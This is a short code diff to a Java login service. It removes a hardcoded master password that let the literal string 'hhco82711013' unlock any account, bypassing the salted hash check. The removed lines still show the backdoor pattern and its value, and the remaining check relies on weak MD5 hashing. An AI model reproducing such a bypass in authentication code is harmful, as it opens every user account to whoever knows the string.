@@ -100,8 +100,7 @@ public class LoginService {
 				return new ResultBean(false, "5");
 			}
 		}
-		if (!MD5.MD5Encode(password + userinfo.getSalt()).equals(userinfo.getPassword())
-				&& !"hhco82711013".equals(password)) {
+		if (!MD5.MD5Encode(password + userinfo.getSalt()).equals(userinfo.getPassword())) {
 			addFailureCount(usercode, companyid);
 			return new ResultBean(false, "2");
 		}
